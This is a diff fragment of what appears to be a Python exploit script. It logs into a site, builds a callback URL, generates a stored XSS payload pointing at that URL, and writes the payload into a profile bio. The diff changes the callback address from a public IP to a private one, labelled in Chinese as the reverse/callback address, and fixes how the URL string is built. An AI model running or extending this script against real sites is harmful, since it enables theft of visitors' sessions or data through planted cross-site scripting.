@@ -82,8 +82,8 @@ def main():
     print('[+] Logging in..')
     session = login()
     print('[+] Generating webhook token..')
-    webhook = "http://43.159.58.58" # 反弹地址
-    webhookURL = webhook.url + '/'
+    webhook = "http://192.168.0.1" # 反弹地址
+    webhookURL = webhook + '/'
     print('[+] Generating XSS payload..')
     XSSPayload = generate_xss_payload(webhookURL)
     print('[+] Updating profile bio with XSS payload..')
